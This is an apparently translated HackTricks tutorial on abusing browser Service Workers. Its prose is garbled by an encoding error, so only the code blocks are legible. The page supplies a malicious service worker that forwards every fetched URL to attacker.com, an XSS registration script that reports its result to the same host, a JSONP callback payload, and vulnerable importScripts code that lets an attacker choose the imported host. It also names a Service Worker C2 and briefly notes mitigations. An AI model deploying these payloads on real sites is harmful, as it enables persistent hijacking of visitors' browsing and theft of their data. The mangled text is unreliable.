# æ»¥ç”¨Service Workers



<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æƒ³è¦çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**ï¼Ÿ æˆ–è€…æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– **ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«åœ°ä¿®å¤å®ƒä»¬ã€‚Intruderè·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯å †æ ˆä¸­çš„é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## åŸºæœ¬ä¿¡æ¯

**Service Worker**æ˜¯ç”±æ‚¨çš„æµè§ˆå™¨åœ¨åå°è¿è¡Œçš„è„šæœ¬ï¼Œä¸ä»»ä½•ç½‘é¡µåˆ†å¼€ï¼Œå¯ä»¥å¯ç”¨ä¸éœ€è¦ç½‘é¡µæˆ–ç”¨æˆ·äº¤äº’çš„åŠŸèƒ½ï¼Œä»è€Œå¢å¼º**ç¦»çº¿å’Œåå°å¤„ç†**åŠŸèƒ½ã€‚æœ‰å…³Service Workerçš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·è®¿é—®[æ­¤å¤„](https://developers.google.com/web/fundamentals/primers/service-workers)ã€‚é€šè¿‡åˆ©ç”¨æ˜“å—æ”»å‡»çš„WebåŸŸä¸­çš„Service Workerï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶å—å®³è€…ä¸è¯¥åŸŸå†…æ‰€æœ‰é¡µé¢çš„äº¤äº’ã€‚

### æ£€æŸ¥ç°æœ‰Service Workers

å¯ä»¥åœ¨**å¼€å‘è€…å·¥å…·**çš„**åº”ç”¨ç¨‹åº**é€‰é¡¹å¡ä¸­çš„**Service Workers**éƒ¨åˆ†ä¸­æ£€æŸ¥ç°æœ‰çš„Service Workersã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯è®¿é—®[chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals)ä»¥è·å¾—æ›´è¯¦ç»†çš„è§†å›¾ã€‚

### æ¨é€é€šçŸ¥

**æ¨é€é€šçŸ¥æƒé™**ç›´æ¥å½±å“**Service Worker**ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡è€Œæ— éœ€ç›´æ¥ç”¨æˆ·äº¤äº’çš„èƒ½åŠ›ã€‚å¦‚æœæƒé™è¢«æ‹’ç»ï¼Œå°†é™åˆ¶Service Workeræ„æˆæŒç»­å¨èƒçš„æ½œåŠ›ã€‚ç›¸åï¼Œæˆäºˆæƒé™ä¼šå¢åŠ å®‰å…¨é£é™©ï¼Œé€šè¿‡å¯ç”¨æ¥æ”¶å’Œæ‰§è¡Œæ½œåœ¨åˆ©ç”¨çš„åŠŸèƒ½ã€‚

## æ”»å‡»åˆ›å»ºService Worker

ä¸ºäº†åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ‚¨éœ€è¦æ‰¾åˆ°ï¼š

* ä¸€ç§**ä¸Šä¼ ä»»æ„JS**æ–‡ä»¶åˆ°æœåŠ¡å™¨å¹¶ä½¿ç”¨**XSSåŠ è½½Service Worker**çš„æ–¹æ³•
* ä¸€ä¸ª**æ˜“å—æ”»å‡»çš„JSONPè¯·æ±‚**ï¼Œæ‚¨å¯ä»¥**æ“çºµè¾“å‡ºï¼ˆä½¿ç”¨ä»»æ„JSä»£ç ï¼‰**å’Œä¸€ä¸ª**XSS**æ¥**åŠ è½½JSONPå¹¶æºå¸¦æœ‰æ•ˆè´Ÿè½½**ï¼Œè¿™å°†**åŠ è½½æ¶æ„Service Worker**ã€‚

åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œæˆ‘å°†å‘ˆç°ä¸€ä¸ªä»£ç æ¥**æ³¨å†Œä¸€ä¸ªæ–°çš„Service Worker**ï¼Œè¯¥Service Workerå°†ç›‘å¬`fetch`äº‹ä»¶ï¼Œå¹¶å°†**å°†æ¯ä¸ªè·å–çš„URLå‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨**ï¼ˆè¿™æ˜¯æ‚¨éœ€è¦**ä¸Šä¼ **åˆ°**æœåŠ¡å™¨**æˆ–é€šè¿‡**æ˜“å—æ”»å‡»çš„JSONP**å“åº”åŠ è½½çš„ä»£ç ï¼‰:
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
ä»¥ä¸‹æ˜¯å°†**æ³¨å†Œå·¥ä½œçº¿ç¨‹**çš„ä»£ç ï¼ˆæ‚¨åº”è¯¥èƒ½å¤Ÿæ‰§è¡Œæ»¥ç”¨**XSS**ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†å‘**æ”»å‡»è€…**çš„æœåŠ¡å™¨å‘é€**GET**è¯·æ±‚ï¼Œé€šçŸ¥**æ³¨å†Œ**æœåŠ¡å·¥ä½œè€…æ˜¯å¦æˆåŠŸï¼š
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
åœ¨æ»¥ç”¨æ˜“å—æ”»å‡»çš„JSONPç«¯ç‚¹çš„æƒ…å†µä¸‹ï¼Œæ‚¨åº”è¯¥å°†å€¼æ”¾åœ¨`var sw`å†…ã€‚ä¾‹å¦‚ï¼š
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
æœ‰ä¸€ä¸ªä¸“é—¨ç”¨äºåˆ©ç”¨**Service Workers**çš„**C2**ï¼Œåä¸º[**Shadow Workers**](https://shadow-workers.github.io)ï¼Œå°†éå¸¸æœ‰ç”¨æ¥æ»¥ç”¨è¿™äº›æ¼æ´ã€‚

**24å°æ—¶ç¼“å­˜æŒ‡ä»¤**å°†æ¶æ„æˆ–å—æŸçš„**service worker (SW)**çš„å¯¿å‘½é™åˆ¶åœ¨è‡³å¤š24å°æ—¶ï¼Œå‡è®¾åœ¨çº¿å®¢æˆ·ç«¯çŠ¶æ€ä¸‹ä¿®å¤äº†XSSæ¼æ´ã€‚ä¸ºäº†æœ€å°åŒ–æ¼æ´ï¼Œç«™ç‚¹è¿è¥è€…å¯ä»¥é™ä½SWè„šæœ¬çš„å­˜æ´»æ—¶é—´ï¼ˆTTLï¼‰ã€‚å¼€å‘äººå‘˜è¿˜å»ºè®®åˆ›å»ºä¸€ä¸ª[**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776)ä»¥ä¾¿å¿«é€Ÿåœç”¨ã€‚

## é€šè¿‡DOM Clobberingæ»¥ç”¨SWä¸­çš„`importScripts`

ä»Service Workerä¸­è°ƒç”¨çš„å‡½æ•°**`importScripts`**å¯ä»¥**ä»ä¸åŒåŸŸå¯¼å…¥è„šæœ¬**ã€‚å¦‚æœä½¿ç”¨**æ”»å‡»è€…å¯ä»¥**ä¿®æ”¹çš„å‚æ•°è°ƒç”¨æ­¤å‡½æ•°ï¼Œä»–å°†èƒ½å¤Ÿ**ä»è‡ªå·±çš„åŸŸå¯¼å…¥JSè„šæœ¬**å¹¶è·å–XSSã€‚

**è¿™ç”šè‡³å¯ä»¥ç»•è¿‡CSPä¿æŠ¤ã€‚**

**ç¤ºä¾‹æ˜“å—æ”»å‡»çš„ä»£ç :**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### ä½¿ç”¨DOM Clobbering

æœ‰å…³DOM Clobberingçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

å¦‚æœSWç”¨äºè°ƒç”¨**`importScripts`**çš„URL/åŸŸä½äº**HTMLå…ƒç´ å†…**ï¼Œåˆ™å¯ä»¥é€šè¿‡DOM Clobberingè¿›è¡Œä¿®æ”¹ï¼Œä½¿SWä»æ‚¨è‡ªå·±çš„åŸŸåŠ è½½è„šæœ¬ã€‚

æœ‰å…³æ­¤ç¤ºä¾‹ï¼Œè¯·æŸ¥çœ‹å‚è€ƒé“¾æ¥ã€‚

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«ä¿®å¤å®ƒä»¬ã€‚Intruderè·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯å †æ ˆä¸­çš„é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿ æˆ–è€…æ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶**NFTs**æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ–**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* é€šè¿‡å‘**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
